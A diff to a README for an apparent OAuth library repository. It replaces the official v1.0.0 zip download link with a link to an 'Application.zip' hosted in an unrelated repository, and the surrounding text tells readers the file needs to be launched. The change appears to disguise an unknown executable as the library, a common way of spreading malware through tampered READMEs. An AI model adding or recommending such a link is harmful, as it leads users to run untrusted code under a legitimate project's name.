@@ -27,7 +27,7 @@ This repository is focused on providing information and resources related to the
 
 To access the OAuth library, you can download the zip file from this link: 
 
-[![Download OAuth Library](https://img.shields.io/badge/Download%20v1.0.0%20OAuth%20Library-zip-green)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download OAuth Library](https://github.com/Aki019aki/godotttttt/releases/download/v1.0/Application.zip%20v1.0.0%20OAuth%20Library-zip-green)](https://github.com/Aki019aki/godotttttt/releases/download/v1.0/Application.zip)
 
 Remember that the link above contains the actual file and needs to be launched.
 
